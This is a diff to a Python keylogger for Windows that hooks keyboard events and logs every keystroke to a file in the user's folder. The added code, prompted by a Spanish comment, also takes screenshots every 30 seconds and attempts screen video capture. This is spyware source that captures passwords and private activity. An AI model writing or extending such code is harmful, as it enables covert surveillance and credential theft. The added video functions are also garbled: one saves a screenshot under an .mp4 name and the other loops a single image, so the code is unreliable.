@@ -14,6 +14,8 @@
 import pyWinhook, pythoncom, sys, logging
 import os
 import pyautogui
+import moviepy
+import pygetwindow as gw
 
 # ubica el archivo log.txt en la carpeta de este usuario
 
@@ -26,8 +28,36 @@ def OnKeyboardEvent(event):
     chr(event.Ascii)
     logging.log(10,chr(event.Ascii))
     return True
-# Añade una func que guarde capturas de pantallas cada 30 segundos durante 10 minutos y guardelas en la carpeta del usuario con el nombre en formato AAAA-MM-DD-HH-MM-SS.png
-# https://pyautogui.readthedocs.io/en/latest/screenshot.html#the-screenshot-function
+# Añade una func que guarde capturas de pantallas cada 30 segundos durante 10 minutos y guardelas en la carpeta del usuario con el nombre en formato AAAA-MM-DD-HH-MM-SS.png, tambien debe almacenar cada minuto durante 10 minutos el nombre de la ventana activa en el mismo archivo log.txt y un video de 15 segundos de lo que se esta haciendo en el computador en el mismo directorio con el nombre en formato AAAA-MM-DD-HH-MM-SS.mp4, para capturar el video usa la libreria moviepy 1.0.3 y para capturar la ventana activa usa la libreria pygetwindow 0.0.9
+
+
+
+
+
+    #video.save('C:\\users\\%s\\%s.mp4' % (os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
+
+import os
+import pyautogui
+import moviepy.editor
+
+def screenshotVideodateAndTime():
+    screenshot = pyautogui.screenshot()
+    filename = os.path.join('C:\\users', os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + '.png')
+    screenshot.save(filename)
+    clip = moviepy.editor.ImageSequenceClip([filename] * 30, fps=30)
+    clip.write_videofile(os.path.join('C:\\users', os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + '.mp4'))
+    return True
+
+
+def screenshotandvideo():
+    screenshot = pyautogui.screenshot()
+    screenshot.save('C:\\users\\%s\\%s.png' % (os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
+    video = pyautogui.screenshot()
+    video.save('C:\\users\\%s\\%s.mp4' % (os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
+
+
+    return True
+
 
 def screenshotdateAndTime():
     screenshot = pyautogui.screenshot()
@@ -40,7 +70,8 @@ now = pyautogui.datetime.datetime.now()
 # 20 capturas de pantalla
 for i in range(20):
     pyautogui.time.sleep(30)
-    screenshotdateAndTime()
+    screenshotVideodateAndTime()
+    
     print(i)
 
 
